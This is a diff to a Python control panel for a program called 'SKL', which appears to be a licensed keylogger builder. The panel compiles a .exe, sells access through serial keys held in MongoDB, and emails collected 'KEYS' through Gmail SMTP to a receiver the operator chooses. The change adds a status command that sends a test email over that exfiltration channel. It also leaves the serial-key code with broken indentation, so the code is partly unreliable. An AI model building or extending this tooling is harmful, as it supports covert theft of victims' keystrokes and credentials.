@@ -8,6 +8,7 @@ import requests
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 import time
+import threading
 
 
 #!# -----------------------------------CONSTANTS----------------------------------- #!#
@@ -16,7 +17,7 @@ import time
 os.system("cls")
 
 
-commands_list = ["exit", "help", "compile", "config", "emails", "test", "mode", "test", "start"]
+commands_list = ["exit", "help", "compile", "config", "emails", "test", "mode", "test", "start", "status"]
 modes = ["email", "local"]
 
 
@@ -334,13 +335,9 @@ def check_config():
 
 
 
-#!# -----------------------------------CONTROL PANEL----------------------------------- #!#
+#%# -----------------------------------CONTROL PANEL----------------------------------- #%#
 
 
-
-
-
-    
 
 
 def __main__():
@@ -363,7 +360,7 @@ def __main__():
                bcolors.RESET_DIM + "(compile) " + bcolors.DIM + "Compiles the project into a .exe to be used." + bcolors.RESET_DIM + 
                "\n(exit) " + bcolors.DIM + "Close the SKL Program" +
                  bcolors.RESET_DIM + "\n(emails) " + bcolors.DIM + "Shows your current saved config."+bcolors.RESET_DIM + "\n(Mode)" +
-                 bcolors.DIM + " choose between 'local' or 'email' mode." + bcolors.RESET_DIM)
+                 bcolors.DIM + " choose between 'local' or 'email' mode." + bcolors.RESET_DIM + "\n(status) " + bcolors.DIM + "Checks the status of various things in the program")
         
 
     elif CONSOLE.lower() == "config":
@@ -388,11 +385,6 @@ def __main__():
 
     elif CONSOLE.lower() == "compile":
         try:
-            
-            
-            
-            
-            
             if check_config() == False:
                 pass
             else:    
@@ -431,6 +423,10 @@ def __main__():
         os.system("cls")
         printlogo()
         print(newConfig.mode())
+        
+    elif CONSOLE.lower() == "status":
+        status()
+        
         
     if return_c == 1:
         bcolors.WHITE
@@ -481,9 +477,7 @@ def connectToDatabase(returnItem):
             return serial_keys
         elif returnItem == "database":
             return database
-       
-        
-        
+
     except:
         print("Failed to connect to SKL database!\nAre you a registered user? Please contact voidy6059 on discord about this issue.")
 
@@ -519,6 +513,77 @@ def returnUserHostName():
     except:
         return False
     
+#!# -----------------------------------CONFIG RELATED----------------------------------- #!#
+    
+    
+def status():
+    
+   
+    if returnUserHostName():
+        print(bcolors.OKGREEN + "License ✅")
+    else:
+        print(bcolors.FAIL +"License ❌")
+        
+    try:
+        with open(f"{JsonPath}") as f:
+                data = json.load(f)
+                
+                try:
+                    mode = data["mode"]
+                                
+                except:
+                    print(bcolors.FAIL + "Your mode configuration is not setup properly.\nplease use \"mode\" to set it up")
+                   
+                if mode == "email":
+                
+                    try:
+                        senderEmail = data["sender_email"]
+                        senderPassword = data["sender_password"]
+                        receiverEmail = data["receiver_email"]
+                    except:
+                        print(bcolors.FAIL + "Your configuration (emails/password) arent setup correctly.\nplease use \"config\" to set them up")
+                       
+             
+                
+    
+        def email(keysGiven):
+            port = 465  # For SSL
+            smtp_server = "smtp.gmail.com"
+            sender_email = senderEmail
+            receiver_email = receiverEmail  
+            password = senderPassword
+            message = f"""\
+                Subject: KEYS 
+
+            {keysGiven}."""
+
+            context = ssl.create_default_context()
+            with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+                server.login(sender_email, password)
+                server.sendmail(sender_email, receiver_email, message)
+                
+                
+        if mode == "email":
+            try:
+                email("Status Check")
+                print(bcolors.OKGREEN +"Email ✅")
+            except:
+                print(bcolors.FAIL +"Email ❌")
+        else:
+            pass
+    except:
+        print(bcolors.FAIL +"Email ❌")
+    
+    try:
+        if connectToDatabase("database") != None:
+            print(bcolors.OKGREEN + "Database ✅")
+    except:
+        print(bcolors.FAIL + "Database ❌")
+        
+    print(bcolors.OKBLUE + "\nStatus check complete.")
+ 
+        
+        
     
     
 #@# -----------------------------------LICENSE----------------------------------- #@#
@@ -544,9 +609,6 @@ def license():
     serial = input("Serial key: ")
     
     if serial in serial_keys:
-        with open(f"{path}/serial.json","w") as file:
-            serial_key_json = {"serial": serial}
-            json.dump(serial_key_json, file)
             returnCollection(serial)
             return True
       
